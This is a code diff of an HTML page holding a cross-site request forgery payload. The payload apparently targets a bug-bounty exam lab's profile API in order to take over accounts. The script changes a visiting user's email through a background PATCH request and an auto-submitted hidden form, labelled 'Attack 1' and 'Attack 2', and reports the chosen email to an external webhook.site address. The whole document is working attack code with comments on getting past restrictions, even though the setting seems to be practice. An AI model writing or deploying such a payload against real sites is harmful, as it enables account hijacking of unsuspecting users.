@@ -3,23 +3,34 @@
 <body>
     <script>
         const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        
-        // Use a COMPLETELY NEW email that you haven't used in the lab before
-        const newEmail = "final_takeover_" + Math.floor(Math.random() * 10000) + "@pwned.com";
+        const newEmail = "hacker" + Math.floor(Math.random() * 9999) + "@attack.com";
 
+        // Attack 1: Standard Fetch (Background)
         fetch(target, {
             method: "PATCH",
-            mode: "no-cors",
-            headers: { "Content-Type": "text/plain" },
+            headers: { "Content-Type": "application/json" }, // Try strict JSON
             body: JSON.stringify({
                 "email": newEmail,
-                "fullName": "Pwned By Student"
+                "fullName": "PWNED"
             })
-        }).then(() => {
-            // Log the exact email used so you can use it to log in
-            fetch(webhook + "?check_this_email=" + newEmail);
         });
+
+        // Attack 2: HTML Form (Bypasses many security restrictions)
+        const form = document.createElement('form');
+        form.method = 'POST'; // Some APIs allow POST to act as PATCH
+        form.action = target;
+        
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'email';
+        input.value = newEmail;
+        
+        form.appendChild(input);
+        document.body.appendChild(form);
+        
+        // Final Step: Log the email to your webhook so you know which one to use!
+        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?attempting_email=" + newEmail)
+        .then(() => form.submit());
     </script>
 </body>
 </html>
